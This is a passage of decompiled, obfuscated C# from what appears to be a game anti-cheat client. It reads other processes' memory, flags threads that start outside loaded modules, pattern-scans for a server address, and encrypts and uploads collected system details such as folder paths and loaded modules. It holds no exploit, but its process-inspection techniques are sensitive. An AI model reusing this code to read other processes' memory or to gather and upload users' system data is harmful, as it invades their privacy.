				result = (IntPtr)((long)((ulong)gstruct.uint_18));
			}
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_16, ex.ToString());
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
		return result;
	}

	// Token: 0x06000640 RID: 1600
	private bool QueryThreadStatistics(Process process_1, GEnum48 genum48_0, bool bool_3, GEnum23 genum23_0, ref int int_2, ref double double_0, ref double double_1)
	{
		IntPtr intPtr = IntPtr.Zero;
		bool flag = false;
		GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
		double_0 = 0.0;
		double_1 = 0.0;
		int_2 = 0;
		bool result;
		try
		{
			intPtr = GClass45.OpenProcess(1040, false, process_1.Id);
			if (!(intPtr == IntPtr.Zero))
			{
				ProcessThreadCollection threads = process_1.Threads;
				GClass49.IsCurrentProcessElevated();
				Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower();
				TimeSpan timeSpan = default(TimeSpan);
				TimeSpan t = default(TimeSpan);
				List<MAIN.Class19> list = new List<MAIN.Class19>();
				long num = process_1.MainModule.BaseAddress.ToInt64();
				long num2 = num + (long)process_1.MainModule.ModuleMemorySize;
				int num3 = 0;
				while (num3 < threads.Count && !this.SafeGetBool())
				{
					try
					{
						timeSpan += threads[num3].TotalProcessorTime;
					}
					catch (Win32Exception)
					{
					}
					catch (InvalidOperationException)
					{
					}
					IntPtr threadEntryPoint = GClass49.GetThreadEntryPoint((uint)threads[num3].Id);
					if (!(threadEntryPoint != IntPtr.Zero))
					{
						goto IL_280;
					}
					IntPtr moduleBaseAddress = GClass49.GetModuleBaseAddress(process_1, threadEntryPoint);
					if (!(moduleBaseAddress == IntPtr.Zero))
					{
						if (threadEntryPoint.ToInt64() >= num && threadEntryPoint.ToInt64() < num2)
						{
							int_2++;
							try
							{
								if (threads[num3].TotalProcessorTime < t)
								{
									t = threads[num3].TotalProcessorTime;
								}
								goto IL_32A;
							}
							catch (Win32Exception)
							{
								goto IL_32A;
							}
							catch (InvalidOperationException)
							{
								goto IL_32A;
							}
						}
						try
						{
							list.Add(new MAIN.Class19(threads[num3].Id, threads[num3].TotalProcessorTime, threadEntryPoint, moduleBaseAddress));
							goto IL_32A;
						}
						catch (Win32Exception)
						{
							goto IL_32A;
						}
						catch (InvalidOperationException)
						{
							goto IL_32A;
						}
						goto IL_280;
					}
					try
					{
						list.Add(new MAIN.Class19(threads[num3].Id, threads[num3].TotalProcessorTime, threadEntryPoint, moduleBaseAddress));
					}
					catch (Win32Exception)
					{
					}
					catch (InvalidOperationException)
					{
					}
					bool flag2 = false;
					if (GClass49.IsMemoryProtected(intPtr, threadEntryPoint))
					{
						flag2 = true;
					}
					else if (!bool_3 && GClass45.VirtualQueryEx(intPtr, threadEntryPoint, out gstruct, Marshal.SizeOf(gstruct)) > 0 && GClass17.smethod_5(intPtr, threadEntryPoint))
					{
						flag2 = true;
					}
					if (flag2)
					{
						string mappedFileNameInfo = GClass45.GetMappedFileNameInfo(intPtr, threadEntryPoint);
						long long_;
						if (mappedFileNameInfo != null && mappedFileNameInfo.Length > 0)
						{
							long_ = this.HandleFileAccessRights(GEnum21.const_3, genum48_0, mappedFileNameInfo, null, GEnum51.const_2);
						}
						else
						{
							long_ = -1L;
						}
						string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, threadEntryPoint);
						this.LogEvent(GEnum21.const_3, memoryRegionInfo, -1, long_, genum23_0);
						goto IL_32A;
					}
					goto IL_32A;
					IL_31F:
					num3++;
					continue;
					IL_2B7:
					IntPtr intPtr2;
					moduleBaseAddress = GClass49.GetModuleBaseAddress(process_1, intPtr2);
					if (moduleBaseAddress == IntPtr.Zero)
					{
						string mappedFileNameInfo2 = GClass45.GetMappedFileNameInfo(intPtr, threadEntryPoint);
						long long_;
						if (mappedFileNameInfo2 != null && mappedFileNameInfo2.Length > 0)
						{
							long_ = this.HandleFileAccessRights(GEnum21.const_4, genum48_0, mappedFileNameInfo2, null, GEnum51.const_2);
						}
						else
						{
							long_ = -1L;
						}
						string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, intPtr2);
						this.LogEvent(GEnum21.const_4, memoryRegionInfo, -1, long_, genum23_0);
						goto IL_31F;
					}
					goto IL_31F;
					IL_280:
					try
					{
						list.Add(new MAIN.Class19(threads[num3].Id, threads[num3].TotalProcessorTime, threadEntryPoint, IntPtr.Zero));
						goto IL_32A;
					}
					catch (Win32Exception)
					{
						goto IL_32A;
					}
					catch (InvalidOperationException)
					{
						goto IL_32A;
					}
					goto IL_2B7;
					IL_32A:
					intPtr2 = this.QueryThreadStackBase(threads[num3].Id);
					if (intPtr2 != IntPtr.Zero)
					{
						goto IL_2B7;
					}
					goto IL_31F;
				}
				double_0 = (process_1.TotalProcessorTime - timeSpan).TotalMilliseconds;
				if (list.Count > 0)
				{
					MAIN.Class19 @class = list[0];
					for (int i = 1; i < list.Count; i++)
					{
						if (list[i].TimeSpan_0 > @class.TimeSpan_0)
						{
							@class = list[i];
						}
					}
					double_1 = @class.TimeSpan_0.TotalMilliseconds;
					string mappedFileNameInfo3 = GClass45.GetMappedFileNameInfo(intPtr, @class.IntPtr_0);
					long long_;
					if (mappedFileNameInfo3 != null && mappedFileNameInfo3.Length > 0)
					{
						long_ = this.HandleFileAccessRights(GEnum21.const_22, genum48_0, mappedFileNameInfo3, null, GEnum51.const_2);
					}
					else
					{
						long_ = -1L;
					}
					string memoryRegionInfo = GClass49.GetMemoryRegionInfo(process_1, @class.IntPtr_0);
					this.LogEvent(GEnum21.const_22, memoryRegionInfo, -1, long_, genum23_0);
				}
				return true;
			}
			this.AddToErrorLog(GEnum22.const_27, Marshal.GetLastWin32Error().ToString());
			result = flag;
		}
		catch (Exception ex)
		{
			this.AddToErrorLog(GEnum22.const_28, ex.ToString());
			return flag;
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				GClass45.CloseHandle(intPtr);
			}
		}
		return result;
	}

	// Token: 0x06000641 RID: 1601
	public string ScanHLProcess()
	{
		IntPtr intPtr = IntPtr.Zero;
		if (this.process_0 != null && !this.SafeGetBool())
		{
			GClass45.GStruct4 gstruct = default(GClass45.GStruct4);
			GClass45.GStruct5 gstruct2 = default(GClass45.GStruct5);
			GClass45.GetSystemInfo(ref gstruct2);
			uint num = 0U;
			List<GClass52> list = new List<GClass52>();
			string text = null;
			try
			{
				List<GClass53> list_ = new List<GClass53>
				{
					new GClass53(Class14.Byte_6, Class14.String_168, Class14.int_366),
					new GClass53(Class14.Byte_8, Class14.String_153, Class14.int_358),
					new GClass53(Class14.Byte_23, Class14.String_70, Class14.int_242),
					new GClass53(Class14.Byte_16, Class14.String_211, Class14.int_27),
					new GClass53(Class14.Byte_17, Class14.String_27, Class14.int_180),
					new GClass53(Class14.Byte_54, Class14.String_120, Class14.int_32),
					new GClass53(Class14.Byte_18, Class14.String_192, Class14.int_155)
				};
				GClass52 item = new GClass52(Class14.String_235, Class15.NormalizeFilePath(Path.Combine(this.gclass51_0.String_2, Class14.String_235)), list_, false);
				list.Add(item);
				GClass52 item2 = new GClass52(Class14.String_116, Class15.NormalizeFilePath(Path.Combine(this.gclass51_0.String_2, Class14.String_116)), list_, false);
				list.Add(item2);
				GClass52 item3 = new GClass52(this.process_0.MainModule.ModuleName, this.process_0.MainModule.FileName, list_, false);
				list.Add(item3);
				IntPtr intptr_ = IntPtr.Zero;
				byte[] array = new byte[40];
				Array.Clear(array, 0, array.Length);
				uint num2 = gstruct2.uint_1;
				if (num2 == 0U)
				{
					num2 = 4096U;
				}
				uint num3 = num2;
				byte[] array2 = new byte[num3];
				int num4 = 100;
				intPtr = GClass45.OpenProcess(1040, false, this.process_0.Id);
				if (intPtr != IntPtr.Zero)
				{
					int num5 = 0;
					while (num5 < list.Count && !this.SafeGetBool())
					{
						GClass52 gclass = list[num5];
						ProcessModule processModule = GClass49.FindProcessModule(this.process_0, gclass.String_0, gclass.String_1, GClass49.GEnum43.const_3);
						if (processModule != null)
						{
							num4 = gclass.method_0();
							IntPtr intPtr2 = processModule.BaseAddress;
							IntPtr intPtr3 = (IntPtr)(processModule.BaseAddress.ToInt64() + (long)processModule.ModuleMemorySize);
							try
							{
								while (!this.SafeGetBool() && intPtr2.ToInt64() < intPtr3.ToInt64() && GClass45.VirtualQueryEx(intPtr, intPtr2, out gstruct, Marshal.SizeOf(gstruct)) > 0)
								{
									IntPtr intPtr4 = (IntPtr)(intPtr2.ToInt64() + gstruct.intptr_2.ToInt64());
									if (gstruct.uint_2 != 16U && gstruct.uint_2 != 32U)
									{
										if (gstruct.uint_2 != 64U)
										{
											if (gstruct.uint_2 != 128U)
											{
												if (gstruct.uint_2 != 4U)
												{
													goto IL_5DF;
												}
											}
										}
									}
									if (GClass49.CanExecuteCodeInMemory(gstruct))
									{
										IntPtr intPtr5 = intPtr2;
										IntPtr intPtr6 = intPtr5;
										num3 = num2;
										do
										{
											if (intPtr5.ToInt64() + (long)((ulong)num3) > intPtr4.ToInt64())
											{
												num3 = (uint)(intPtr4.ToInt64() - intPtr5.ToInt64());
												Array.Clear(array2, 0, array2.Length);
											}
											if (!GClass45.ReadProcessMemory(intPtr, intPtr5, array2, num3, ref num) || num != num3)
											{
												break;
											}
											int num6 = 0;
											while (num6 < gclass.List_0.Count && !this.SafeGetBool())
											{
												GClass53 gclass2 = gclass.List_0[num6];
												int num7 = 0;
												do
												{
													num7 = Class15.SearchBytePattern(array2, gclass2.Byte_0, gclass2.String_0, num7, 0);
													if (num7 > -1)
													{
														int num8 = num7 + gclass2.Int32_0[0];
														try
														{
															if ((long)(num8 + 4) >= (long)((ulong)num3))
															{
																break;
															}
															intptr_ = (IntPtr)((long)((ulong)BitConverter.ToUInt32(array2, num8)));
															if (intptr_.ToInt64() >= processModule.BaseAddress.ToInt64() && intptr_.ToInt64() < intPtr3.ToInt64())
															{
																if (!GClass45.ReadProcessMemory(intPtr, intptr_, array, (uint)array.Length, ref num) || (ulong)num != (ulong)((long)array.Length))
																{
																	Array.Clear(array, 0, array.Length);
																	break;
																}
																uint num9 = BitConverter.ToUInt32(array, 0);
																if (num9 == 1U)
																{
																	text = <Module>.DeserializeFromByteArray3<string>(2376760584U);
																	return text;
																}
																if (num9 != 3U)
																{
																	if (num9 != 0U)
																	{
																		int num10 = 0;
																		int i = 4;
																		while (i < 18)
																		{
																			num10++;
																			string str = text;
																			string str2 = array[i].ToString(<Module>.DeserializeFromByteArray<string>(4071675807U));
																			if (i == 4 || num10 % 2 != 0)
																			{
																				goto IL_49C;
																			}
																			if (i + 1 == 18)
																			{
																				goto IL_49C;
																			}
																			string str3 = <Module>.DeserializeFromByteArray3<string>(3791849231U);
																			IL_4A1:
																			text = str + str2 + str3;
																			i++;
																			continue;
																			IL_49C:
																			str3 = "";
																			goto IL_4A1;
																		}
																	}
																}
																else
																{
																	for (int j = 4; j < 8; j++)
																	{
																		string str4 = text;
																		int num11 = (int)array[j];
																		text = str4 + num11.ToString() + ((j + 1 == 8) ? "" : <Module>.DeserializeFromByteArray<string>(3022576053U));
																	}
																}
																if (num9 != 0U && Class15.get_ip_address(text))
																{
																	text = string.Format(<Module>.DeserializeFromByteArray3<string>(682881201U), text, (ushort)((int)array[18] << 8 | (int)array[19]));
																	return text;
																}
															}
															goto IL_5E6;
														}
														catch (OverflowException)
														{
															goto IL_5E6;
														}
														goto IL_55F;
														IL_5E6:
														num7 += gclass2.Byte_0.Length;
													}
													if (num7 <= -1)
													{
														break;
													}
												}
												while (!this.SafeGetBool());
												IL_5CD:
												num6++;
												continue;
												goto IL_5CD;
											}
											IL_55F:
											intPtr6 = (IntPtr)(intPtr6.ToInt64() + (long)((ulong)num3));
											intPtr5 = (IntPtr)(intPtr6.ToInt64() - (long)num4);
											if ((ulong)num3 == (ulong)((long)num4))
											{
												break;
											}
											if (intPtr5.ToInt64() >= intPtr4.ToInt64())
											{
												break;
											}
										}
										while (!this.SafeGetBool());
										IL_5D8:
										intPtr2 = intPtr4;
										continue;
										goto IL_5D8;
									}
									IL_5DF:
									intPtr2 = intPtr4;
								}
							}
							catch (Exception ex)
							{
								this.AddToErrorLog(GEnum22.const_32, ex.ToString());
							}
						}
						num5++;
					}
				}
			}
			catch (Exception ex2)
			{
				this.AddToErrorLog(GEnum22.const_33, ex2.ToString());
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					GClass45.CloseHandle(intPtr);
				}
			}
			return text;
		}
		return null;
	}

	// Token: 0x06000642 RID: 1602
	private void IncrementCounterAndInvokeUpdate()
	{
		if (!this.SafeGetBool())
		{
			Interlocked.Increment(ref this.int_0);
			base.Invoke(new MethodInvoker(this.UpdateProgressLabel));
		}
	}

	// Token: 0x06000643 RID: 1603
	private string HTTPCommunicationScan()
	{
		string result = null;
		try
		{
			base.Invoke(new MethodInvoker(this.SetStatusLabelToDefaultText));
			GClass56 gclass = new GClass56();
			gclass.Proxy = null;
			gclass.Int32_0 = Class15.int_0;
			gclass.Headers.Add(HttpRequestHeader.UserAgent, Class12.String_5);
			gclass.Headers.Add(HttpRequestHeader.ContentType, <Module>.DeserializeFromByteArray<string>(2690184447U));
			NameValueCollection nameValueCollection = new NameValueCollection();
			string string_ = Class50.GenerateSystemInfoString(this.EncryptByteArrayToBase64(this.byte_0), this.string_1);
			byte[] array = Class13.GenerateRandomBytes(32);
			string text = Class13.EncryptString(string_, array);
			string text2 = Class13.RSAStringEncryptionToBase64(Convert.ToBase64String(array));
			string value = Class13.ConvertRSASignToBase64(text + text2);
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(2770832366U)] = text;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(414246580U)] = text2;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(2589493363U)] = value;
			byte[] bytes = null;
			try
			{
				bytes = gclass.UploadValues(Class12.smethod_2(Class12.Boolean_0, <Module>.DeserializeFromByteArrayV2<string>(3451484501U)), <Module>.DeserializeFromByteArray<string>(2371617216U), nameValueCollection);
			}
			catch (WebException ex)
			{
				if (ex.InnerException == null)
				{
					throw ex;
				}
				if (!(ex.InnerException is AuthenticationException) && !(ex.InnerException is IOException))
				{
					throw ex;
				}
				Class12.Boolean_0 = false;
				gclass = new GClass56();
				gclass.Proxy = null;
				gclass.Int32_0 = Class15.int_0;
				gclass.Headers.Add(HttpRequestHeader.UserAgent, Class12.String_5);
				gclass.Headers.Add(HttpRequestHeader.ContentType, <Module>.DeserealizeFromByteArrayV2_1<string>(1052998357U));
				bytes = gclass.UploadValues(Class12.smethod_2(Class12.Boolean_0, <Module>.DeserializeFromByteArray<string>(3778222767U)), <Module>.DeserializeFromByteArray<string>(2371617216U), nameValueCollection);
			}
			string @string = Encoding.UTF8.GetString(bytes);
			bool flag = false;
			if (!@string.Contains(Class14.String_220))
			{
				if (!@string.Contains(Class14.String_183))
				{
					if (!@string.Contains(Class14.String_78))
					{
						if (@string.Contains(Class14.String_97))
						{
							MAIN.Class24 @class = new MAIN.Class24();
							@class.gform0_0 = this;
							@class.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
							base.Invoke(new MethodInvoker(this.AnotherFuckingButton));
							int num = @string.IndexOf(Class14.String_97);
							if (num != -1)
							{
								int num2 = @string.IndexOf(<Module>.DeserealizeFromByteArrayV2_1<string>(2281206640U));
								if (num2 != -1)
								{
									MAIN.Class25 class2 = new MAIN.Class25();
									class2.class24_0 = @class;
									class2.string_0 = @string.Substring(num + 6, num2 - 6 - num);
									flag = true;
									base.Invoke(new MethodInvoker(class2.method_0));
								}
							}
						}
					}
					else
					{
						MAIN.Class22 class3 = new MAIN.Class22();
						class3.gform0_0 = this;
						class3.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
						base.Invoke(new MethodInvoker(class3.method_0));
						int num3 = @string.IndexOf(Class14.String_78);
						if (num3 != -1)
						{
							int num4 = @string.IndexOf(<Module>.DeserializeFromByteArray3<string>(1793103161U));
							if (num4 != -1)
							{
								MAIN.Class23 class4 = new MAIN.Class23();
								class4.class22_0 = class3;
								class4.string_0 = @string.Substring(num3 + 7, num4 - 7 - num3);
								flag = true;
								base.Invoke(new MethodInvoker(class4.method_0));
							}
						}
					}
				}
				else
				{
					base.Invoke(new MethodInvoker(this.BullshitButtonText39million));
					int num5 = @string.IndexOf(Class14.String_183);
					if (num5 != -1)
					{
						int num6 = @string.IndexOf(<Module>.DeserializeFromByteArrayV2<string>(828040102U));
						if (num6 != -1)
						{
							MAIN.Class21 class5 = new MAIN.Class21();
							class5.gform0_0 = this;
							class5.string_0 = @string.Substring(num5 + 4, num6 - 4 - num5);
							flag = true;
							base.Invoke(new MethodInvoker(class5.method_0));
						}
					}
				}
			}
			else
			{
				int num7 = @string.IndexOf(Class14.String_220);
				if (num7 != -1)
				{
					int num8 = @string.IndexOf(<Module>.DeserializeFromByteArray<string>(1433880182U));
					if (num8 != -1)
					{
						string[] array2 = @string.Substring(num7 + 6, num8 - 6 - num7).Split(new char[]
						{
							'!'
						});
						if (array2.Length == 2 && Class13.CompareSignature(array2[0], array2[1]))
						{
							string[] array3 = Encoding.UTF8.GetString(Convert.FromBase64String(array2[0])).Split(new char[]
							{
								';'
							});
							if (array3.Length == 2)
							{
								byte[] byte_ = Class13.DecryptRSAFromBase64(array3[0]);
								string text3 = Class13.smethod_6(array3[1], byte_);
								if (text3 != null && text3 != string.Empty)
								{
									string[] array4 = text3.Split(new char[]
									{
										'|'
									});
									if (array4.Length == 2)
									{
										result = array4[0];
										this.string_4 = Encoding.UTF8.GetString(Convert.FromBase64String(array4[1]));
										flag = true;
									}
								}
							}
						}
					}
				}
			}
			if (!flag)
			{
				MAIN.Class26 class6 = new MAIN.Class26();
				class6.gform0_0 = this;
				class6.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
				base.Invoke(new MethodInvoker(class6.method_0));
			}
			gclass.Dispose();
		}
		catch (WebException ex2)
		{
			MAIN.Class27 class7 = new MAIN.Class27();
			class7.gform0_0 = this;
			class7.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
			if (ex2.Status == WebExceptionStatus.Timeout)
			{
				base.Invoke(new MethodInvoker(class7.method_0));
			}
			else
			{
				MAIN.Class28 class8 = new MAIN.Class28();
				class8.class27_0 = class7;
				class8.httpWebResponse_0 = GClass56.smethod_0(ex2);
				base.Invoke(new MethodInvoker(class8.method_0));
			}
		}
		catch (CryptographicException)
		{
			MAIN.Class29 class9 = new MAIN.Class29();
			class9.gform0_0 = this;
			class9.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
			base.Invoke(new MethodInvoker(class9.method_0));
		}
		catch (Exception)
		{
			MAIN.Class30 class10 = new MAIN.Class30();
			class10.gform0_0 = this;
			class10.string_0 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
			base.Invoke(new MethodInvoker(class10.method_0));
		}
		return result;
	}

	// Token: 0x06000644 RID: 1604
	private Dictionary<string, long> CountLoadedModuleOccurrences()
	{
		Process[] processes = Process.GetProcesses();
		Dictionary<string, long> dictionary = new Dictionary<string, long>();
		long num = 1L;
		int num2 = 0;
		while (num2 < processes.Length && !this.SafeGetBool())
		{
			try
			{
				ProcessModuleCollection modules = processes[num2].Modules;
				int num3 = 0;
				while (num3 < modules.Count && !this.SafeGetBool())
				{
					string text = modules[num3].FileName.ToLower();
					GEnum51 genum = GEnum51.const_2;
					text = GClass44.NormalizeFilePath(text, this.bool_2, ref genum);
					if (dictionary.TryGetValue(text, out num))
					{
						num = (dictionary[text] = num + 1L);
					}
					else
					{
						dictionary.Add(text, 1L);
					}
					num3++;
				}
			}
			catch
			{
			}
			num2++;
		}
		return dictionary;
	}

	// Token: 0x06000645 RID: 1605
	private string GenerateLoadedModuleOccurrencesString()
	{
		Dictionary<string, long> dictionary = this.CountLoadedModuleOccurrences();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < this.gclass51_0.List_1.Count; i++)
		{
			GClass44 gclass = this.gclass51_0.List_1[i];
			string key = gclass.String_1.ToLower();
			long int64_;
			if (!dictionary.TryGetValue(key, out int64_))
			{
				gclass.Int64_1 = 1L;
			}
			else
			{
				gclass.Int64_1 = int64_;
			}
			stringBuilder.Append(gclass.ToString());
			if (i + 1 < this.gclass51_0.List_1.Count)
			{
				stringBuilder.Append(';');
			}
		}
		return stringBuilder.ToString();
	}

	// Token: 0x06000646 RID: 1606
	private string StringBuildDetect(List<GClass41> list_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < list_0.Count; i++)
		{
			stringBuilder.Append(list_0[i].ToString());
			if (i + 1 < list_0.Count)
			{
				stringBuilder.Append(';');
			}
		}
		return stringBuilder.ToString();
	}

	// Token: 0x06000647 RID: 1607
	private void EncryptAndUploadDataAsync()
	{
		try
		{
			base.Invoke(new MethodInvoker(this.SetLabelToDefaultText));
			this.gclass51_0.String_1 = DateTime.Now.ToString(Class15.string_0, CultureInfo.InvariantCulture);
			GClass56 gclass = new GClass56();
			gclass.Proxy = null;
			gclass.Int32_0 = Class15.int_0;
			gclass.Headers.Add(HttpRequestHeader.UserAgent, Class12.String_5);
			gclass.Headers.Add(HttpRequestHeader.ContentType, <Module>.DeserializeFromByteArrayV2<string>(2886816005U));
			NameValueCollection nameValueCollection = new NameValueCollection();
			byte[] array = Class13.GenerateRandomBytes(32);
			string text = Class13.RSAStringEncryptionToBase64(Convert.ToBase64String(array));
			string text2 = Class13.EncryptString(this.string_1, array);
			string text3 = Class13.EncryptString(this.gclass51_0.String_6, array);
			string text4 = Class13.EncryptString(this.gclass51_0.String_14, array);
			string text5 = Class13.EncryptString(this.gclass51_0.String_5, array);
			string text6 = Class13.EncryptString(this.gclass51_0.String_7, array);
			string text7 = Class13.EncryptString(this.gclass51_0.DateTime_0.ToString(Class15.string_0, CultureInfo.InvariantCulture), array);
			string string_ = this.StringBuildDetect(this.gclass51_0.List_0);
			string text8 = Class13.EncryptString(this.gclass51_0.String_10, array);
			string text9 = Class13.EncryptString(this.gclass51_0.String_9, array);
			string text10 = Class13.EncryptString(this.gclass51_0.String_11, array);
			string text11 = Class13.EncryptString(this.gclass51_0.String_12, array);
			string text12 = Class13.EncryptString(this.gclass51_0.String_13, array);
			string text13 = Class13.EncryptString(Class15.ListToString(this.gclass51_0.List_4, ';'), array);
			string text14 = Class13.EncryptString(string_, array);
			string text15 = Class13.EncryptString(this.gclass51_0.String_4, array);
			string text16 = Class13.EncryptString(this.gclass51_0.String_0, array);
			string text17 = Class13.EncryptString(this.gclass51_0.String_1, array);
			string text18 = Class13.EncryptString(this.gclass51_0.String_8, array);
			string text19 = Class13.EncryptString(Class15.ListToString(this.gclass51_0.List_3, ';'), array);
			string text20 = Class13.EncryptString(Class15.ListToString(this.gclass51_0.List_2, ';'), array);
			string text21 = Class13.EncryptString(Class15.ListToString(this.gclass51_0.List_5, ';'), array);
			string text22 = Class13.EncryptString(Class15.ListToString(this.gclass51_0.List_7, ';'), array);
			string text23 = Class13.EncryptString(Class15.ListToString(this.gclass51_0.List_6, ';'), array);
			string text24 = Class13.EncryptString(((int)this.gclass51_0.GEnum34_0).ToString(), array);
			string text25 = Class13.EncryptString(((int)this.gclass51_0.GEnum23_0).ToString(), array);
			string text26 = Class13.EncryptString(this.gclass51_0.long_0.ToString(), array);
			string text27 = Class13.EncryptString(this.gclass51_0.long_1.ToString(), array);
			string text28 = Class13.EncryptString(this.gclass51_0.string_15.ToString(), array);
			string text29 = Class13.EncryptString(Class15.ListToString(this.gclass51_0.List_9, ';'), array);
			string text30 = Class13.EncryptString(Class15.ListToString(this.gclass51_0.List_10, ';'), array);
			string text31 = Class13.EncryptString(Class15.ListToString2(this.gclass51_0.List_11, ';'), array);
			string text32 = Class13.EncryptString(this.gclass51_0.long_3.ToString(), array);
			string text33 = Class13.EncryptString(this.gclass51_0.long_4.ToString(), array);
			string text34 = Class13.EncryptString(this.gclass51_0.long_2.ToString(), array);
			string text35 = "";
			if (this.gclass51_0.GClass55_0 == null)
			{
				text35 = Class13.EncryptString("", array);
			}
			else
			{
				text35 = Class13.EncryptString(GClass55.ConcatStringAndAppendToList(this.gclass51_0.GClass55_0.List_0), array);
			}
			string text36 = Class13.EncryptString(this.gclass51_0.double_0.ToString(), array);
			string text37 = Class13.EncryptString(this.gclass51_0.double_1.ToString(), array);
			string text38 = Class13.EncryptString(this.gclass51_0.int_0.ToString(), array);
			string text39 = Class13.EncryptString(this.gclass51_0.Boolean_0 ? <Module>.DeserializeFromByteArray3<string>(423071921U) : <Module>.DeserializeFromByteArray2<string>(2777778027U), array);
			string text40 = Class13.EncryptString(Class12.Boolean_0 ? <Module>.DeserializeFromByteArray3<string>(423071921U) : <Module>.DeserealizeFromByteArrayV2_1<string>(1606687038U), array);
			string text41 = Class13.EncryptString(this.bool_0 ? <Module>.DeserializeFromByteArray2<string>(3165454329U) : <Module>.DeserializeFromByteArray3<string>(1552324843U), array);
			string text42 = Class13.EncryptString(GClass51.smethod_0(this.gclass51_0.dictionary_0), array);
			List<string> list = new List<string>();
			foreach (string text43 in this.gclass51_0.List_8)
			{
				string item = Class15.MD5HashFromString(text43);
				if (Class15.StringExistsInList(list, item, false))
				{
					list.Add(item);
				}
			}
			string text44 = Class13.EncryptString(Class15.ListToString(list, ';'), array);
			string text45 = Class13.EncryptString(Class15.ListToString(new List<string>
			{
				Class15.SanitizeString(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)),
				Class15.SanitizeString(this.gclass51_0.String_2),
				Class15.SanitizeString(this.gclass51_0.String_3),
				Class15.SanitizeString(Class15.GetSystemDirectory())
			}, ';'), array);
			string text46 = Class13.EncryptString(this.gclass51_0.bool_1 ? <Module>.DeserializeFromByteArray2<string>(3165454329U) : <Module>.DeserializeFromByteArray2<string>(2777778027U), array);
			string text47 = Class13.EncryptString(this.GenerateLoadedModuleOccurrencesString(), array);
			string value = Class13.EncryptString(this.string_3, array);
			string value2 = Class13.ConvertRSASignToBase64(Class15.ConcatenateStrings(new string[]
			{
				text2,
				text3,
				text4,
				text5,
				text6,
				text7,
				text14,
				text15,
				text16,
				text17,
				text8,
				text9,
				text10,
				text11,
				text12,
				text13,
				text18,
				text,
				text47,
				text20,
				text19,
				text21,
				text22,
				text23,
				text24,
				text26,
				text28,
				text44,
				text29,
				text30,
				text31,
				text32,
				text27,
				text33,
				text34,
				text35,
				text36,
				text37,
				text38,
				text25,
				text42,
				text39,
				text40,
				text45,
				text46,
				text41
			}, Class15.char_1));
			nameValueCollection[<Module>.DeserializeFromByteArray3<string>(663850239U)] = text18;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(1531483525U)] = text2;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(2915636376U)] = text3;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(3857541337U)] = text4;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(1040162308U)] = text5;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(102425274U)] = text6;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(3459655536U)] = text7;
			nameValueCollection[<Module>.DeserializeFromByteArray3<string>(2237191945U)] = text14;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(2254699736U)] = text15;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(646444434U)] = text16;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(4261016260U)] = text17;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(1110374350U)] = text;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(3888069311U)] = value2;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(1190463594U)] = value;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(3827013363U)] = text47;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(3993670406U)] = text20;
			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(4016032850U)] = text19;
			nameValueCollection[<Module>.DeserializeFromByteArray3<string>(422774885U)] = text8;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(2567010772U)] = text9;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(4153975982U)] = text10;
			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(2572852138U)] = text11;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(1422685386U)] = text12;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(3414013516U)] = text13;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(403027846U)] = text21;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(4245217639U)] = text22;
			nameValueCollection[<Module>.DeserializeFromByteArray3<string>(866863669U)] = text23;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(2276308155U)] = text24;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(4276004654U)] = text26;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(843028496U)] = text44;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(1888631853U)] = text28;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(979014099U)] = text29;
			nameValueCollection[<Module>.DeserializeFromByteArrayV2<string>(3086714086U)] = text30;
			nameValueCollection[<Module>.DeserializeFromByteArray<string>(324585196U)] = text31;
			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(3961929948U)] = text32;
			nameValueCollection[<Module>.DeserealizeFromByteArrayV2_1<string>(2879544414U)] = text27;
			nameValueCollection[<Module>.DeserializeFromByteArray2<string>(2917395609U)] = text33;
